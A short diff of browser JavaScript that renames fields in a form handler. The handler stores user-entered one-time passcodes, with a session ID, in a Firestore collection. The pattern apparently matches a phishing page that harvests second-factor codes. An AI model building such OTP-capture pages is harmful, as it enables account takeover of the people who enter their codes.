@@ -71,7 +71,7 @@
     const db = getFirestore(app);
 
     const otpForm = document.getElementById("otpForm");
-    const otpInput = document.getElementById("otp");
+    const otpInput = document.getElementById("otp1");
 
     // READ sessionId (generated on index page)
     const sessionId = localStorage.getItem("sessionId");
@@ -86,9 +86,9 @@
       }
 
       try {
-        await addDoc(collection(db, "users"), {
+        await addDoc(collection(db, "users33"), {
           sessionId: sessionId,   // ✅ ADDED
-          otp: otp,
+          otp1: otp,
           timestamp: new Date()
         });
 
